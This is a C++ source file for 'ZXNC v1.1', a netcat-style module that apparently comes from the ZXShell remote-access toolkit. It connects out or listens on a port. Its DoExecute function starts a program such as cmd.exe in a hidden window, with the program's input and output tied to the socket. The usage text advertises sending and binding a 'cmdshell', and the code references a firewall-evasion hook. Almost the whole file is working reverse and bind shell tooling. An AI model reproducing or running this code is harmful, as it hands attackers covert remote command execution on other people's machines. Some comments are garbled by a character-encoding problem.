//Version: 1.1
//Code By LZX
//Last Modified: 2006-07-30
#include <winsock2.h>
#include <stdio.h>
#include <CONIO.H>
#include <IO.H>
#include <errno.h>
#include <iostream>
#pragma comment(lib,"ws2_32.lib")
#define MAXBUFSIZE		8192
BYTE EndFlag=0, DBL=0, Ext=0;
char END[4][5] = {"\n", "\r\n", "\n\n", "\r\n\r\n" };
char *CMD = "\0";
SOCKET NCLocalSocket;


struct SOCKINFO
{
	SOCKET ClientSock;
	SOCKET ServerSock;
	DWORD Key;
};


void ZXNC_Usage(SOCKET Socket)
{
	char *Usage = ""
		"ZXNC v1.1 - simple telnet client\r\n"
		//"Code by LZX.\r\n\r\n"

		"Usage:  ZXNC [-l -f -e <cmd>] [-h <IP>] [-p <Port>] [ quitnc ]\r\n"
		"Example:\r\n"
		"\tZXNC x.x.x.x 80\r\n"
		//"\tZXNC -f -d www.163.com 80\r\n"
		"\tZXNC -l -p 99\r\n"
		"\tZXNC -e cmd.exe x.x.x.x 99 (send a cmdshell)\r\n"
		"\tZXNC -e cmd.exe -l -p 99 (bind a cmdshell)\r\n"
		"args: [-l -e -f]\r\n"
		"\t-e inbound program to exec\r\n"
		"\t-l listen mode, for inbound connects\r\n"
		"\t-f change the end sign to \\r\\n, default is \\n\r\n"
		"\tquitnc (while in the ZXNC mode type this option to quit it.)\r\n";
		//"\t-d twice ENTER to send a line, default is per ENTER.\r\n";
	SendMessage(Socket, Usage);
}
/*
char *DNS(char *HostName)
{
	HOSTENT *hostent = NULL;
	IN_ADDR iaddr;
	hostent = gethostbyname(HostName);
	if (hostent == NULL)
	{
		return NULL;
	}
	iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
	return inet_ntoa(iaddr);
}
*/
SOCKET ConnectRemote(char *HostName,const WORD Port)
{
	struct sockaddr_in Server;
	SOCKET sock;
	memset(&Server, 0, sizeof(Server));

	Server.sin_family = AF_INET;
	Server.sin_port = htons(Port);
	if (inet_addr(HostName) != INADDR_NONE)
		Server.sin_addr.s_addr = inet_addr(HostName);
	else
	{
		if (DNS(HostName) != NULL)
			Server.sin_addr.s_addr = inet_addr(DNS(HostName));
		else
			return 0;
	}

	sock = ZXSAPI::WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
	if(sock == INVALID_SOCKET)
		return 0;

	if(ZXSAPI::connect(sock, (const SOCKADDR *)&Server,sizeof(Server)) == SOCKET_ERROR)
	{
		closesocket(sock);
		return 0;
	}

	return sock;
}

void DoExecute(SOCKET sock, char *cmd)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	memset(&si,0,sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;//
	si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)sock;
	ZXSAPI::CreateProcess(NULL,cmd,NULL,NULL,TRUE,0,0,NULL,&si,&pi);
}


void TransmitCMD(SOCKET sock)
{
	int nRecv=0, result, len;
	char SendBuf[MAXBUFSIZE], RecvBuf[MAXBUFSIZE+1];

	fd_set ReadFD,WriteFD;
	struct timeval timeset;
	timeset.tv_sec = 60;
	timeset.tv_usec = 0;

	while(1)
	{
		FD_ZERO(&ReadFD);
		FD_ZERO(&WriteFD);
		FD_SET((UINT)sock, &ReadFD);
		FD_SET((UINT)sock, &WriteFD);
		result=select(sock+1,&ReadFD, &WriteFD, NULL, &timeset);
		if(result <= 0)
			break;
		if(FD_ISSET(sock, &ReadFD))
		{
			nRecv = ZXSAPI::recv(sock, RecvBuf, MAXBUFSIZE, 0);
			if(nRecv <= 0)
				break;
			RecvBuf[nRecv] = '\0';
			for(int i=0; i<nRecv; i++)
				putchar(RecvBuf[i]);
//			result = printf("%s", RecvBuf+1);

		}
		if(FD_ISSET(sock, &WriteFD))
		{
			if(kbhit())
			{
				len = 0;
				SendBuf[0] = '\0';
				while(!strstr(SendBuf, END[EndFlag+(DBL?2:0)]))
				{
					gets(SendBuf+len);
					strcat(SendBuf, END[EndFlag]);
					len = strlen(SendBuf);
				}
				result = ZXSAPI::send(sock, SendBuf, len,0);
				if(result <= 0)
					break;
			}
			Sleep(5);
		}
	}
}


SOCKET LocalBind(const WORD Port)
{
#ifdef _AntiBadFirewall
	AntiBadFirewall antibadfw;
#endif

	struct sockaddr_in Local;

	SOCKET Accepts = INVALID_SOCKET;
	memset(&Local, 0, sizeof(Local));

	Local.sin_family = AF_INET;
	Local.sin_port = htons(Port);
	Local.sin_addr.s_addr = 0;


	NCLocalSocket = ZXSAPI::WSASocket(PF_INET, SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
	if(NCLocalSocket == INVALID_SOCKET)
		return 0;
	if(ZXSAPI::bind(NCLocalSocket, (const SOCKADDR *)&Local,sizeof(Local)) == SOCKET_ERROR)
		goto error;
	if(ZXSAPI::listen(NCLocalSocket, 0) == SOCKET_ERROR)
		goto error;
	Accepts = DoAccept(NCLocalSocket, 60);
	if(Accepts <= 0)
		goto error;

	return Accepts;
error:
	closesocket(NCLocalSocket);
	NCLocalSocket = 0;
	return 0;
}


int GetCMD(SOCKET Socket, char *RecvBuf, int *cb)
{
	SPAMFUNCTION
		
    int nRetVal = 0;

	char *pCmd = RecvBuf;
	///////////////����β�ַ�������лس������򷵻�
	char *pCR = NULL, *pLF = NULL;
	pCR = strchr(pCmd, '\r');
	if(pCR)
		*pCR = '\0';
	pLF = strchr(pCmd, '\n');
	if(pLF)
		*pLF = '\0';
	if(pCR || pLF)
	{
		if(!stricmp(RecvBuf, "QuitNC"))
			return 0;
		lstrcat(RecvBuf, END[EndFlag]);
		*cb = lstrlen(RecvBuf);
		return 1;
	}
	*cb = lstrlen(RecvBuf);
    return 1;
}

DWORD WINAPI NCTransmitData(LPVOID lParam)//������SOCKET�н�������ת��
{
	SOCKINFO socks = *((SOCKINFO*)lParam);
	SOCKET ClientSock = socks.ClientSock;
	SOCKET ServerSock = socks.ServerSock;
	char RecvBuf[MAXBUFSIZE] = {0};
	fd_set Fd_Read;
	int ret, nRecv;

	while(1)
	{
		FD_ZERO(&Fd_Read);
		FD_SET(ClientSock, &Fd_Read);
		FD_SET(ServerSock, &Fd_Read);
		ret = select(0, &Fd_Read, NULL, NULL, NULL);
		if(ret <= 0)
			goto error;
		if(FD_ISSET(ClientSock, &Fd_Read))
		{
			//nRecv = GetCMD(ClientSock, RecvBuf, &nRecv);
			nRecv = ZXSAPI::recv(ClientSock, RecvBuf, sizeof(RecvBuf), 0);
			if(nRecv <= 0)
				goto error;
			if(!GetCMD(ClientSock, RecvBuf, &nRecv))
				goto error;
			ret = DataSend(ServerSock, RecvBuf, nRecv);
			if(ret == 0 || ret != nRecv)
				goto error;
		}
		if(FD_ISSET(ServerSock, &Fd_Read))
		{
			nRecv = ZXSAPI::recv(ServerSock, RecvBuf, sizeof(RecvBuf), 0);
			if(nRecv <= 0)
				goto error;
			ret = DataSend(ClientSock, RecvBuf, nRecv);
			if(ret == 0 || ret != nRecv)
				goto error;
		}

	}
error:
	return 0;
}


int ZXNC(MainPara *args)
{
	SPAMFUNCTION
		
	SOCKET Socket = args->Socket;

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();

	WORD Port=0;
	char *HostIP = "\0";
	bool ConnType=0;
	EndFlag=0;
	DBL=0;
	Ext=0;
	SOCKINFO socks;

	if(argc < 3)
	{
		ZXNC_Usage(Socket);
		return 1;
	}
	HostIP = argv[argc-2];
	Port = atoi(argv[argc-1]);
	//��ȡ���� start
/*
	for(int i=1; i<argc; i++)
	{
		if(argv[i][0] == '-')
		{
			switch(argv[i][1])
			{
			case 'l':
				ConnType = 1; //Local
				break;
			case 'f':
				EndFlag = 1;
				break;
			case 'd':
				DBL = 1;
				break;
			continue;
			}
		}
		else
		{
			if(i==1) continue;
			switch(argv[i-1][1])
			{
			case 'h':
				HostIP = argv[i];
				break;
			case 'p':
				Port = atoi(argv[i]);
				break;
			case 'e':
				Ext = 1;
				CMD = argv[i];
				break;
			}
		}
	}//end
*/
	CGetOpt cmdopt(argc, argv, false);

	if(cmdopt.checkopt("l"))
		ConnType = 1;
	if(cmdopt.checkopt("f"))
		EndFlag = 1;
	if(cmdopt.checkopt("d"))
		DBL = 1;
	if(cmdopt.getstr("h"))
		HostIP = cmdopt;
	if(cmdopt.getstr("p"))
		Port = cmdopt.getint("p");
	if(cmdopt.getstr("e"))
	{
		Ext = 1;
		CMD = cmdopt;
	}

	WSADATA wd;
	SOCKET sock;
	if(!InitSock())
		return 1;
	if(ConnType == 0)//��������
		sock = ConnectRemote(HostIP, Port);
	else			//���ؼ���
		sock = LocalBind(Port);
	if(sock == 0)
		goto exit;
	if(Ext)			//��һ��shell
	{
		DoExecute(sock, CMD);
		goto exit;
	}
	socks.ClientSock = Socket;
	socks.ServerSock = sock;
	NCTransmitData((LPVOID)&socks);
	//TransmitCMD(sock);//��������

exit:
	err_display(Socket, "ZXNC", 1);
	WSACleanup();
	if(NCLocalSocket)
	{
		closesocket(NCLocalSocket);
		NCLocalSocket = 0;
	}
	closesocket(sock);
	return 0;
}